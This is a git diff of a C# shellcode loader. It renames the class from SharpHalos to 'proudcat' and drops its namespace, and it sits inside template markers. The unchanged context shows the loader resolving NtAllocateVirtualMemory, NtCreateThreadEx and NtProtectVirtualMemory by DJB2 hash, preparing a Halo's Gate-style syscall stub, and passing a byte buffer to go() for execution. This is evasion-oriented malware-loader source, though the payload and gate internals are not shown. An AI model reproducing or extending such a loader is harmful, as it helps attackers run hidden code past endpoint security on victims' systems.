@@ -13,12 +13,10 @@ using System.Security.Cryptography;
 
 //####DEFINE####
 
-namespace proudcat
-{
 
-    //####CODE####
+//####CODE####
 
-    public class Program
+    public class proudcat
     {
 
         public bool IsGateReady = false;
@@ -131,7 +129,7 @@ namespace proudcat
 
         public bool PrepareGateSpace()
         {
-            MethodInfo method = typeof(SharpHalos).GetMethod("JITMeDaddy", BindingFlags.Static | BindingFlags.NonPublic);
+            MethodInfo method = typeof(proudcat).GetMethod("JITMeDaddy", BindingFlags.Static | BindingFlags.NonPublic);
             if (method == null)
             {
                 return false;
@@ -683,11 +681,11 @@ namespace proudcat
 
         public static void go(byte[] MeowcodeBytes)
         {
-            UInt64 NTAVMHash = SharpHalos.GetFunctionDJB2Hash("NtAllocateVirtualMemory");
-            UInt64 NTCTEHash = SharpHalos.GetFunctionDJB2Hash("NtCreateThreadEx");
-            UInt64 NTPVMHash = SharpHalos.GetFunctionDJB2Hash("NtProtectVirtualMemory");
+            UInt64 NTAVMHash = proudcat.GetFunctionDJB2Hash("NtAllocateVirtualMemory");
+            UInt64 NTCTEHash = proudcat.GetFunctionDJB2Hash("NtCreateThreadEx");
+            UInt64 NTPVMHash = proudcat.GetFunctionDJB2Hash("NtProtectVirtualMemory");
 
-            SharpHalos halos = new SharpHalos();
+            proudcat halos = new proudcat();
 
             bool result = halos.PrepareGateSpace();
             if (!result)
@@ -782,4 +780,3 @@ namespace proudcat
             go(buf);
         }
     }
-}
